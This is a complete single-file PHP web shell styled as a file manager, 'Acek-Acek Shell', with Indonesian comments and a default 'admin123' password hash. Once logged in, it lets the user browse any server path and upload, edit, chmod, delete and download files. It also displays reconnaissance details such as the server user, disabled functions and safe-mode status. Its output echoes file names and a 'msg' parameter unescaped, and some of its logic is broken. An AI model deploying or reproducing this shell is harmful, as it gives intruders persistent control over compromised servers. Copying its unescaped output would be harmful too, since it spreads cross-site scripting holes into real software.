<?php
/**
 * Acek-Acek Shell File Manager (Minimalist Web Shell Look - Revisi)
 * Dibuat sebagai solusi single-file file manager yang Fungsional, Aman, dan Bergaya CLI.
 * Revisi: Penggantian tampilan ke UL/LI, penambahan sorting, perbaikan logika.
 */

// --- KONFIGURASI APLIKASI ---
// Hash default: 'admin123'
define('PASS', '$2y$10$D7jHBIO2fX3JFtlAHIP25egciBPjkbg13FOZsCoTYi7uzkNWVVJqi');

// --- INISIALISASI SESI & OTENTIKASI ---
session_start();

// Logout
if (isset($_GET['action']) && $_GET['action'] === 'logout') {
    session_destroy();
    header("Location: ?");
    exit;
}

// Otentikasi
if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {
    if (isset($_POST['password']) && password_verify($_POST['password'], PASS)) {
        $_SESSION['authenticated'] = true;
        // Redirect untuk membersihkan POST data
        header("Location: ?");
        exit;
    } else if (isset($_POST['password'])) {
        $login_error = "Kata Sandi Salah.";
    }
}

if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {
    // Tampilkan Form Login (Mempertahankan style CLI)
    echo '<!DOCTYPE html><html lang="id"><head><meta charset="UTF-8"><title>Login Acek-Acek Shell</title>';
    echo '<script src="https://cdn.tailwindcss.com"></script><style>body { background-color: #1a1a1a; color: #00ff00; font-family: \'Consolas\', monospace; line-height: 1.6; } .prompt { color: #00ffff; } .box { border: 1px solid #00ff00; padding: 20px; }</style></head><body>';
    echo '<div class="max-w-md mx-auto mt-20 box"><pre><h2 class="prompt text-xl mb-4">Acek-Acek Shell Login</h2>';
    if (isset($login_error)) {
        echo '<span class="error text-red-500 mb-2">' . $login_error . '</span>';
    }
    echo '<form method="POST"><label for="password" class="prompt">Password: </label><input type="password" id="password" name="password" class="bg-black border border-green-500 text-green-300 px-2 py-1 w-full mt-2" required autofocus><button type="submit" class="bg-green-700 hover:bg-green-600 text-black px-4 py-1 mt-4 border border-green-500 w-full">LOGIN</button></form>';
    echo '</pre></div></body></html>';
    exit;
}

// --- VARIABEL PATH & SORTING ---
$current_path = isset($_GET['path']) ? $_GET['path'] : getcwd();
$current_path = realpath($current_path);

// Logika Sorting
$sort_by = $_GET['sort'] ?? 'name'; // name, size, date
$sort_order = $_GET['order'] ?? 'asc'; // asc, desc

// --- FUNGSI UTAMA UNTUK OPERASI FILE & UTILITY ---

function get_perms($filepath) {
    // Menghasilkan string izin rwxrwxrwx
    if (!file_exists($filepath)) return '?????????';
    $perms = fileperms($filepath);
    $info = ($perms & 0xC000) == 0xC000 ? 's' : (
            ($perms & 0xA000) == 0xA000 ? 'l' : (
            ($perms & 0x8000) == 0x8000 ? '-' : (
            ($perms & 0x6000) == 0x6000 ? 'b' : (
            ($perms & 0x4000) == 0x4000 ? 'd' : (
            ($perms & 0x2000) == 0x2000 ? 'c' : (
            ($perms & 0x1000) == 0x1000 ? 'p' : 'u'))))));

    // Owner
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ?
            (($perms & 0x0800) ? 's' : 'x' ) :
            (($perms & 0x0800) ? 'S' : '-'));

    // Group
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ?
            (($perms & 0x0400) ? 's' : 'x' ) :
            (($perms & 0x0400) ? 'S' : '-'));

    // World
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ?
            (($perms & 0x0200) ? 't' : 'x' ) :
            (($perms & 0x0200) ? 'T' : '-'));

    return $info . ' (' . substr(sprintf('%o', $perms), -4) . ')';
}

function format_bytes($bytes, $precision = 2) {
    $units = array('B', 'KB', 'MB', 'GB', 'TB');
    $bytes = max($bytes, 0);
    $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
    $pow = min($pow, count($units) - 1);
    $bytes /= (1 << (10 * $pow));
    return round($bytes, $precision) . ' ' . $units[$pow];
}

function ls_dir($path, $sort_by, $sort_order) {
    $items = @scandir($path);
    if ($items === false) {
        return "<li class='error'>Error: Tidak bisa membaca direktori $path. Izin Ditolak.</li>";
    }

    $file_list = [];
    foreach ($items as $item) {
        if ($item === '.' || ($item === '..' && realpath($path) === realpath(dirname($path)))) continue;

        $full_path = $path . DIRECTORY_SEPARATOR . $item;
        $is_dir = is_dir($full_path);
        $size = $is_dir ? -1 : (@filesize($full_path) ?: 0); // Gunakan -1 untuk folder agar selalu di atas
        $mtime = @filemtime($full_path) ?: 0;
        
        $file_list[] = [
            'name' => $item,
            'path' => $full_path,
            'is_dir' => $is_dir,
            'size' => $size,
            'mtime' => $mtime,
            'perms_str' => get_perms($full_path),
            'perms_oct' => substr(sprintf('%o', @fileperms($full_path) ?: 0), -4)
        ];
    }

    // Custom Sorting Logic
    usort($file_list, function($a, $b) use ($sort_by, $sort_order) {
        // Prioritas: Folder selalu di atas
        if ($a['is_dir'] != $b['is_dir']) {
            return $a['is_dir'] ? -1 : 1;
        }

        $val_a = $a[$sort_by == 'date' ? 'mtime' : ($sort_by == 'size' ? 'size' : 'name')];
        $val_b = $b[$sort_by == 'date' ? 'mtime' : ($sort_by == 'size' ? 'size' : 'name')];
        
        $result = 0;
        if ($sort_by === 'name') {
            $result = strnatcasecmp($val_a, $val_b);
        } else { // size atau date
            $result = $val_a <=> $val_b;
        }

        return ($sort_order === 'asc') ? $result : -$result;
    });

    $output = "";

    // Tambahkan navigasi ke direktori induk
    if ($current_path !== '/') {
        $parent_path = dirname($current_path);
        if ($parent_path !== $current_path) { // Hindari loop di root
             $output .= sprintf(
                "<li class=\"file-item text-cyan-400\"><span class='col-info'>%-18s</span> <span class='col-size'>%-10s</span> <span class='col-date'>%-20s</span> <a href=\"?path=%s\" class=\"text-yellow-500\">%s</a></li>\n",
                'd????????? (0000)',
                '<DIR>',
                date("M d Y H:i", @filemtime($parent_path) ?: 0),
                urlencode($parent_path),
                '..'
            );
        }
    }
    
    foreach ($file_list as $file) {
        $perms_display = $file['perms_str'];
        $size_display = $file['is_dir'] ? '<DIR>' : format_bytes($file['size']);
        $date_display = date("M d Y H:i", $file['mtime']);
        $url = "?path=" . urlencode($file['path']);
        
        $color_class = $file['is_dir'] ? 'text-cyan-400' : 'text-green-300';
        if (@is_executable($file['path']) && !$file['is_dir']) $color_class = 'text-yellow-500';

        // Format baris UL/LI (menggunakan format string seperti terminal)
        $output .= sprintf(
            "<li class=\"file-item %s\"><span class='col-info'>%-18s</span> <span class='col-size'>%-10s</span> <span class='col-date'>%-20s</span> <a href=\"%s\" data-filename=\"%s\" class=\"file-link %s\">%s</a></li>\n",
            $file['is_dir'] ? 'dir-item' : 'file-item',
            $perms_display,
            str_pad($size_display, 10, ' ', STR_PAD_LEFT),
            $date_display,
            $file['is_dir'] ? $url : '#', // Folder langsung navigasi, File tampilkan menu
            $file['name'],
            $color_class,
            $file['name']
        );
    }
    return $output;
}

function get_system_info() {
    $info = [
        'OS' => php_uname('s') . ' ' . php_uname('r'),
        'Kernel' => php_uname('v'),
        'PHP Version' => PHP_VERSION,
        'Server Software' => $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown',
        'Directory Permission' => is_writable(getcwd()) ? 'Writable' : 'Read-only',
        'User/Group' => function_exists('posix_getpwuid') && function_exists('posix_geteuid') ? (posix_getpwuid(posix_geteuid())['name'] . '/' . posix_getgrgid(posix_getegid())['name']) : 'N/A',
        'Disabled Functions' => ($disabled = ini_get('disable_functions')) ? (empty($disabled) ? 'None' : implode(', ', array_map('trim', explode(',', $disabled)))) : 'N/A',
        'Safe Mode' => ini_get('safe_mode') ? 'ON' : 'OFF',
        'Maximum Execution Time' => ini_get('max_execution_time') . 's',
        'Memory Limit' => ini_get('memory_limit'),
    ];

    $output = "<ul class=\"system-info-list\">";
    foreach ($info as $key => $value) {
        $output .= "<li><span class=\"prompt\">{$key}:</span> {$value}</li>";
    }
    $output .= "</ul>";
    return $output;
}


// --- FUNGSI UNTUK MENANGANI AKSI ---
function handle_action($path) {
    $message = '';
    $action = $_GET['action'] ?? '';
    $target = $_GET['target'] ?? '';
    $new_name = $_POST['new_name'] ?? '';
    $content = $_POST['content'] ?? '';
    $perms = $_POST['perms'] ?? '';

    // Sanitasi input target, pastikan hanya nama file/folder di path saat ini
    $target_file = basename($target);
    $target_path = $path . DIRECTORY_SEPARATOR . $target_file;

    switch ($action) {
        case 'delete':
            if (is_dir($target_path)) {
                if (@rmdir($target_path)) $message = "<span class=\"success\">'{$target_file}' (Folder) berhasil dihapus.</span>";
                else $message = "<span class=\"error\">Gagal menghapus folder '{$target_file}'. (Pastikan kosong)</span>";
            } else {
                if (@unlink($target_path)) $message = "<span class=\"success\">'{$target_file}' (File) berhasil dihapus.</span>";
                else $message = "<span class=\"error\">Gagal menghapus file '{$target_file}'. Izin Ditolak.</span>";
            }
            break;
        case 'rename':
            $new_file = basename($new_name);
            $new_path = dirname($target_path) . DIRECTORY_SEPARATOR . $new_file;
            if (@rename($target_path, $new_path)) {
                $message = "<span class=\"success\">'{$target_file}' berhasil diganti nama menjadi '{$new_file}'.</span>";
            } else {
                $message = "<span class=\"error\">Gagal mengganti nama '{$target_file}'.</span>";
            }
            break;
        case 'edit_save':
            if (@file_put_contents($target_path, $content) !== false) {
                $message = "<span class=\"success\">'{$target_file}' berhasil disimpan.</span>";
            } else {
                $message = "<span class=\"error\">Gagal menyimpan '{$target_file}'. Izin Ditolak.</span>";
            }
            break;
        case 'chmod_save':
            if (preg_match('/^[0-7]{4}$/', $perms)) {
                $octal_perm = octdec($perms);
                if (@chmod($target_path, $octal_perm)) {
                    $message = "<span class=\"success\">Izin '{$target_file}' berhasil diubah ke {$perms}.</span>";
                } else {
                    $message = "<span class=\"error\">Gagal mengubah izin '{$target_file}'.</span>";
                }
            } else {
                $message = "<span class=\"error\">Format Izin (CHMOD) tidak valid. Gunakan 4 digit oktal (contoh: 0755).</span>";
            }
            break;
        case 'mkdir':
            $new_dir_name = basename($new_name);
            $new_dir = $path . DIRECTORY_SEPARATOR . $new_dir_name;
            if (@mkdir($new_dir, 0755)) {
                $message = "<span class=\"success\">Folder '{$new_dir_name}' berhasil dibuat.</span>";
            } else {
                $message = "<span class=\"error\">Gagal membuat folder '{$new_dir_name}'.</span>";
            }
            break;
        case 'mkfile':
            $new_file_name = basename($new_name);
            $new_file = $path . DIRECTORY_SEPARATOR . $new_file_name;
            if (@file_put_contents($new_file, '')) {
                $message = "<span class=\"success\">File '{$new_file_name}' berhasil dibuat.</span>";
            } else {
                $message = "<span class=\"error\">Gagal membuat file '{$new_file_name}'.</span>";
            }
            break;
        case 'upload':
            if (!empty($_FILES['file_upload']['name'])) {
                $file_name = basename($_FILES['file_upload']['name']);
                $upload_path = $path . DIRECTORY_SEPARATOR . $file_name;
                if (@move_uploaded_file($_FILES['file_upload']['tmp_name'], $upload_path)) {
                    $message = "<span class=\"success\">File '{$file_name}' berhasil diunggah.</span>";
                } else {
                    $message = "<span class=\"error\">Gagal mengunggah file. Izin atau ukuran file bermasalah.</span>";
                }
            } else {
                $message = "<span class=\"error\">Tidak ada file yang dipilih.</span>";
            }
            break;
    }
    return $message;
}

$output_message = '';
// Hanya proses aksi yang bukan 'edit' atau 'download' di sini agar tidak mengganggu tampilan
if (isset($_GET['action']) && !in_array($_GET['action'], ['edit', 'download'])) {
    $output_message = handle_action($current_path);
    // Untuk aksi yang berhasil, redirect agar parameter aksi hilang
    if (strpos($output_message, 'berhasil') !== false) {
         header("Location: ?path=" . urlencode($current_path) . "&sort=" . $sort_by . "&order=" . $sort_order);
         exit;
    }
}
?>

<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Acek-Acek File Manager Shell (Revisi)</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body {
            background-color: #1a1a1a;
            color: #00ff00;
            font-family: 'Consolas', 'Monospace', monospace;
            padding: 20px;
            line-height: 1.4; /* Sedikit lebih rapi */
            min-height: 100vh;
        }
        pre, .terminal-output {
            white-space: pre; /* Memastikan format spasi tetap */
            padding: 10px;
            border: 1px solid #00ff00;
            margin-top: 10px;
        }
        .header-line { color: #ffff00; text-decoration: underline; }
        .prompt { color: #00ffff; }
        .success { color: #00ffff; }
        .error { color: #ff3333; }
        .warning { color: #ffcc00; }
        .text-cyan-400 { color: #00ffff; } /* Directory color */
        .text-green-300 { color: #00ff00; } /* File color */
        .cmd-button {
            background-color: #005500;
            color: #00ff00;
            padding: 4px 8px;
            border: 1px solid #00ff00;
            margin-right: 5px;
            cursor: pointer;
            font-size: 0.8rem;
            line-height: 1;
            transition: background-color 0.2s;
            white-space: nowrap;
        }
        .cmd-button:hover { background-color: #008800; }
        .modal-bg {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 100; display: none;
        }
        .modal-content {
            background: #1a1a1a; border: 2px solid #00ff00; padding: 20px; max-width: 600px; margin: 10vh auto;
        }
        .file-content-area {
            width: 100%; height: 300px; background: #000; color: #00ff00; border: 1px solid #00ff00; padding: 10px; font-family: 'Consolas', monospace;
        }
        /* Style untuk Daftar File UL/LI (simulasi format terminal) */
        .file-list ul {
            list-style: none;
            padding: 0;
            margin: 0;
            font-size: 0.85rem;
        }
        .file-list li {
            display: flex;
            white-space: pre; /* Penting untuk format spasi */
        }
        .file-list li span, .file-list li a {
            display: inline-block;
            overflow: hidden;
            text-overflow: ellipsis;
            line-height: 1.6;
        }
        .file-list .col-info { width: 190px; } /* Perizinan dan Oktal */
        .file-list .col-size { width: 120px; text-align: right; }
        .file-list .col-date { width: 200px; }
        .file-list .file-link { flex-grow: 1; }
        
        /* Header Daftar File */
        .file-list-header {
            margin-top: 10px;
            padding: 10px;
            border-bottom: 1px solid #00ff00;
            font-weight: bold;
        }
        .system-info-list {
             list-style: none;
             padding: 0;
             margin: 0;
        }
        .system-info-list li {
            margin-bottom: 5px;
        }
    </style>
</head>
<body>

<div class="max-w-7xl mx-auto">
    <pre class="header text-xl border-none">
================================================================================
|      A C E K - S H E L L  F I L E M A N A G E R  (R E V I S I)               |
================================================================================
    </pre>

    <div class="mb-4">
        <span class="prompt">Jalur Saat Ini:</span>
        <?php
        $path_parts = explode(DIRECTORY_SEPARATOR, trim($current_path, DIRECTORY_SEPARATOR));
        $current_link = '';
        $base_url = "?sort=" . $sort_by . "&order=" . $sort_order;
        echo '<a href="' . $base_url . '&path=/" class="text-cyan-400">/</a>';

        foreach ($path_parts as $part) {
            if (empty($part)) continue;
            $current_link .= DIRECTORY_SEPARATOR . $part;
            echo ' / <a href="' . $base_url . '&path=' . urlencode($current_link) . '" class="text-cyan-400">' . $part . '</a>';
        }
        ?>
    </div>
    
    <div class="terminal-output text-sm bg-black mb-4">
        <h3 class="warning text-base mb-2">Informasi Sistem</h3>
        <?php echo get_system_info(); ?>
    </div>


    <div class="flex flex-wrap gap-2 mb-4">
        <button class="cmd-button" onclick="showModal('mkdir')">MKDIR</button>
        <button class="cmd-button" onclick="showModal('mkfile')">MKFILE</button>
        <button class="cmd-button" onclick="showModal('upload')">UPLOAD</button>
        <a href="?action=logout" class="cmd-button bg-red-700 hover:bg-red-600">LOGOUT</a>
    </div>

    <?php if (!empty($output_message)): ?>
        <div class="terminal-output text-white bg-black mb-4">
            <?php echo $output_message; ?>
        </div>
    <?php endif; ?>

    <div class="file-list-header text-sm">
        <span class="col-info warning">Izin</span> 
        <span class="col-size warning">
            <a href="?path=<?php echo urlencode($current_path); ?>&sort=size&order=<?php echo $sort_by == 'size' && $sort_order == 'asc' ? 'desc' : 'asc'; ?>" class="warning">Ukuran</a>
        </span>
        <span class="col-date warning">
            <a href="?path=<?php echo urlencode($current_path); ?>&sort=date&order=<?php echo $sort_by == 'date' && $sort_order == 'asc' ? 'desc' : 'asc'; ?>" class="warning">Tanggal Modif</a>
        </span>
        <span class="file-link warning">
            <a href="?path=<?php echo urlencode($current_path); ?>&sort=name&order=<?php echo $sort_by == 'name' && $sort_order == 'asc' ? 'desc' : 'asc'; ?>" class="warning">Nama</a>
        </span>
    </div>

    <div class="terminal-output text-sm bg-black file-list">
        <ul>
            <?php echo ls_dir($current_path, $sort_by, $sort_order); ?>
        </ul>
    </div>
</div>

<div id="modal-container" class="modal-bg" onclick="hideModal()">
    <div class="modal-content" onclick="event.stopPropagation()">
        <div id="modal-content-area"></div>
    </div>
</div>

<script>
    const currentPath = '<?php echo addslashes($current_path); ?>';
    const currentSort = '<?php echo $sort_by; ?>';
    const currentOrder = '<?php echo $sort_order; ?>';
    const modalContainer = document.getElementById('modal-container');
    const modalContentArea = document.getElementById('modal-content-area');

    function hideModal() {
        modalContainer.style.display = 'none';
        modalContentArea.innerHTML = '';
        // Bersihkan parameter 'target' dan 'action' dari URL jika ada
        if (window.location.search.includes('action=edit') || window.location.search.includes('target=')) {
            window.history.pushState({}, document.title, `?path=${encodeURIComponent(currentPath)}&sort=${currentSort}&order=${currentOrder}`);
        }
    }

    function showModal(type, target = '') {
        modalContainer.style.display = 'block';
        let content = '';
        let targetFile = target ? target.split('/').pop() : '';

        // Base URL untuk form action, mempertahankan sorting
        const baseUrl = `?path=${encodeURIComponent(currentPath)}&sort=${currentSort}&order=${currentOrder}`;

        switch(type) {
            case 'mkdir':
                content = `<h3 class="prompt text-lg mb-4">Buat Folder Baru</h3>
                    <form method="POST" action="${baseUrl}&action=mkdir">
                        <label class="prompt block mb-2">Nama Folder:</label>
                        <input type="text" name="new_name" class="file-content-area h-auto mb-4 bg-black" required autofocus placeholder="nama_folder_baru">
                        <button type="submit" class="cmd-button bg-green-700 hover:bg-green-600 text-black">BUAT</button>
                        <button type="button" class="cmd-button bg-red-700 hover:bg-red-600 text-black" onclick="hideModal()">BATAL</button>
                    </form>`;
                break;
            case 'mkfile':
                content = `<h3 class="prompt text-lg mb-4">Buat File Baru</h3>
                    <form method="POST" action="${baseUrl}&action=mkfile">
                        <label class="prompt block mb-2">Nama File:</label>
                        <input type="text" name="new_name" class="file-content-area h-auto mb-4 bg-black" required autofocus placeholder="nama_file.txt">
                        <button type="submit" class="cmd-button bg-green-700 hover:bg-green-600 text-black">BUAT</button>
                        <button type="button" class="cmd-button bg-red-700 hover:bg-red-600 text-black" onclick="hideModal()">BATAL</button>
                    </form>`;
                break;
            case 'upload':
                content = `<h3 class="prompt text-lg mb-4">Unggah File</h3>
                    <form method="POST" action="${baseUrl}&action=upload" enctype="multipart/form-data">
                        <label class="prompt block mb-2">Pilih File:</label>
                        <input type="file" name="file_upload" class="mb-4 block">
                        <button type="submit" class="cmd-button bg-green-700 hover:bg-green-600 text-black">UNGGAH</button>
                        <button type="button" class="cmd-button bg-red-700 hover:bg-red-600 text-black" onclick="hideModal()">BATAL</button>
                    </form>`;
                break;
            case 'rename':
                content = `<h3 class="prompt text-lg mb-4">Ganti Nama: ${targetFile}</h3>
                    <form method="POST" action="${baseUrl}&action=rename&target=${encodeURIComponent(targetFile)}">
                        <label class="prompt block mb-2">Nama Baru:</label>
                        <input type="text" name="new_name" value="${targetFile}" class="file-content-area h-auto mb-4 bg-black" required autofocus>
                        <button type="submit" class="cmd-button bg-green-700 hover:bg-green-600 text-black">GANTI</button>
                        <button type="button" class="cmd-button bg-red-700 hover:bg-red-600 text-black" onclick="hideModal()">BATAL</button>
                    </form>`;
                break;
            case 'chmod':
                 // Perlu fetch perms dari PHP saat file menu diklik, atau gunakan hidden input jika perms tidak di GET
                 // Karena perms tidak selalu di GET, kita biarkan saja formnya. Logika PHP akan mengambilnya dari target
                const permsExample = '0755';

                content = `<h3 class="prompt text-lg mb-4">Ubah Izin (CHMOD): ${targetFile}</h3>
                    <form method="POST" action="${baseUrl}&action=chmod_save&target=${encodeURIComponent(targetFile)}">
                        <label class="prompt block mb-2">Izin Oktal (contoh: ${permsExample}):</label>
                        <input type="text" name="perms" value="" placeholder="e.g., ${permsExample}" class="file-content-area h-auto mb-4 bg-black" required pattern="[0-7]{4}" maxlength="4" autofocus>
                        <button type="submit" class="cmd-button bg-green-700 hover:bg-green-600 text-black">UBAH</button>
                        <button type="button" class="cmd-button bg-red-700 hover:bg-red-600 text-black" onclick="hideModal()">BATAL</button>
                    </form>`;
                break;
        }
        modalContentArea.innerHTML = content;
    }

    // Mendengarkan klik pada item file/folder (hanya link file)
    document.querySelectorAll('.file-list .file-link:not(.text-cyan-400)').forEach(link => {
        link.addEventListener('click', function(e) {
            e.preventDefault();
            const fileName = this.getAttribute('data-filename');
            
            // Link aksi harus menyertakan sort/order saat ini
            const baseActionUrl = `?path=${encodeURIComponent(currentPath)}&sort=${currentSort}&order=${currentOrder}&target=${encodeURIComponent(fileName)}`;

            // Tampilkan menu operasi
            const menuContent = `<h3 class="prompt text-lg mb-4">Operasi File: ${fileName}</h3>
                <p class="mb-4">Pilih aksi untuk file ini:</p>
                <a href="${baseActionUrl}&action=edit" class="cmd-button">EDIT</a>
                <a href="${baseActionUrl}&action=download" class="cmd-button">DOWNLOAD</a>
                <button class="cmd-button" onclick="showModal('rename', '${fileName}')">GANTI NAMA</button>
                <button class="cmd-button" onclick="showModal('chmod', '${fileName}')">CHMOD</button>
                <a href="${baseActionUrl}&action=delete" class="cmd-button bg-red-700 hover:bg-red-600">HAPUS</a>
                <button class="cmd-button bg-gray-700 hover:bg-gray-600" onclick="hideModal()">TUTUP</button>`;

            modalContentArea.innerHTML = menuContent;
            modalContainer.style.display = 'block';
        });
    });

    // --- Logic untuk Edit File dan Tampilkan Modal ---
    <?php if (isset($_GET['action']) && $_GET['action'] === 'edit' && isset($_GET['target'])): ?>
        window.onload = function() {
            // Logic PHP untuk membaca konten file
            <?php
            $target = basename($_GET['target']);
            $target_path = $current_path . DIRECTORY_SEPARATOR . $target;
            $content = '';
            $is_readable = false;
            if (is_file($target_path)) {
                $content = @file_get_contents($target_path);
                if ($content === false) {
                    $content = "Error: Izin Ditolak atau File tidak ditemukan.";
                } else {
                    $is_readable = true;
                }
            } else {
                 $content = "Error: File tidak valid.";
            }
            ?>
            
            const fileName = '<?php echo addslashes($target); ?>';
            const fileContent = `<?php echo addslashes($content); ?>`;
            const isReadable = <?php echo json_encode($is_readable); ?>;
            const baseUrl = `?path=${encodeURIComponent(currentPath)}&sort=${currentSort}&order=${currentOrder}`;
            
            let editContent = `<h3 class="prompt text-lg mb-4">Mengedit File: ${fileName}</h3>`;
            
            if (isReadable) {
                editContent += `<form method="POST" action="${baseUrl}&action=edit_save&target=${encodeURIComponent(fileName)}">
                    <textarea name="content" class="file-content-area mb-4">${fileContent}</textarea>
                    <button type="submit" class="cmd-button bg-green-700 hover:bg-green-600 text-black">SIMPAN</button>
                    <a href="${baseUrl}" class="cmd-button bg-red-700 hover:bg-red-600 text-black">BATAL</a>
                </form>`;
            } else {
                 editContent += `<p class="error">${fileContent}</p>
                                 <a href="${baseUrl}" class="cmd-button bg-red-700 hover:bg-red-600 text-black">TUTUP</a>`;
            }

            modalContentArea.innerHTML = editContent;
            modalContainer.style.display = 'block';
            // Hapus parameter action=edit dari URL agar tidak terulang saat refresh
            window.history.pushState({}, document.title, baseUrl);
        };
    <?php endif; ?>

    // --- Logic untuk Download File ---
    <?php
    if (isset($_GET['action']) && $_GET['action'] === 'download' && isset($_GET['target'])) {
        $target_file = basename($_GET['target']);
        $target_path = $current_path . DIRECTORY_SEPARATOR . $target_file;

        if (is_file($target_path) && is_readable($target_path)) {
            header('Content-Description: File Transfer');
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="' . $target_file . '"');
            header('Expires: 0');
            header('Cache-Control: must-revalidate');
            header('Pragma: public');
            header('Content-Length: ' . filesize($target_path));
            readfile($target_path);
            exit;
        } else {
            // Jika gagal download, tampilkan pesan error dan redirect
            $output_message = "<span class=\"error\">Error: File '{$target_file}' tidak ditemukan atau tidak valid untuk diunduh.</span>";
            // Redirect untuk membersihkan parameter GET
            header("Location: ?path=" . urlencode($current_path) . "&sort=" . $sort_by . "&order=" . $sort_order . "&msg=" . urlencode($output_message));
            exit;
        }
    }
    
    // Tampilkan pesan error jika ada dari redirect download
    if (isset($_GET['msg'])) {
         $output_message = urldecode($_GET['msg']);
    }
    ?>
</script>

</body>
</html>